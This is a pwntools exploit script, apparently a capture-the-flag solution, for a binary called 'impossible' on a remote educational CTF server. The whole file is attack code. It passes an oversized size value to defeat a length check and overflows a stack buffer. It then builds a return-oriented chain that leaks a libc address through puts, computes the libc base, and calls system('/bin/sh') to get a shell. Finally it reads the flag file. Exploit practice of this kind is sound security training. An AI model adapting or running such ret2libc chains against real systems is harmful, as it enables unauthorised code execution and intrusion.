from pwn import*
context.arch = 'amd64'
#context.terminal = ['tmux','split','-h']
#context.log_level = 'debug'


binary = ELF('./impossible')
libc = ELF('./libc-2.27.so')

pop_rdi = 0x0000000000400873
puts_plt = binary.symbols['puts']
puts_got = binary.got['puts']
ret = 0x400669
main = 0x0000000000400748

r = remote( "eductf.zoolab.org" ,'10105')
#r = process('./impossible')
#gdb.attach(proc.pidof(r)[0])

r.sendlineafter('Size: ',str(2147483648))


payload = 'A'*0x100
payload += 'B'*8
payload += flat(pop_rdi,
				0x600ff0,
				puts_plt,
				main
				)


r.sendafter("It's safe now :)",(payload))
r.recvline()
leak = u64(r.recv(6)+'\0\0') 
libc_base = leak - libc.symbols['__libc_start_main']
success("libc_base => %s"  %hex(libc_base))
system = libc_base + libc.symbols['system']

exp = "B"*0x108
exp+=flat(pop_rdi,
		 libc_base +libc.search( '/bin/sh' ).next(),
		 ret,
		 system
		 )

r.sendlineafter('Size: ',str(2147483648))
r.sendafter("It's safe now :)",(exp))

sleep(1)

r.sendline( 'cat /home/`whoami`/flag' )

r.interactive()



